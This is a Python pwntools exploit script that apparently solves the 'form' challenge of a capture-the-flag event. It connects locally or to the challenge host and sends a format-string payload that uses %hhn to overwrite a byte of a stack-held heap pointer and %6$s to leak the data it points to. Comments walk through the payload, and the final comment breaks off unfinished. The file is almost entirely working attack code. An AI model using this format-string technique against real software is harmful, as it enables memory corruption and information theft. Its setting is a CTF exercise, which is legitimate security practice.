#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = 'form.chal.imaginaryctf.org', 1337

def start(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE: 
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+207
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = start()

# stack condition:
# stack at-1 : <something>
# stack at-2 : <something>
# stack at-3 : <something>
# stack at-4 : <something>
# stack at-5 : <something>
# stack at-6 : <something>
# stack at-7 :  heap_ptr
# stack at-8 : ptr to stack-7

# @yqroo on TCP1P discord solution: %c%c%c%c%c%155c%hhn%6$s
# yqroo payload explained:
# 1. first 5 %c to access and print the character of the first 5 stack values
# 2. %155c will accesessing the 6th as well printing 155 character for padding
#    since we want to write 0xa0 (160)
# 3. %hhn will write a byte value specified by how many characters have been 
#    written so far which is 160 to our target at stack-7
# 4. %6$s will print the value pointed by 


payload = b'%c%c%c%c%c%155c%hhn%6$s'

io.sendline(payload)
io.interactive()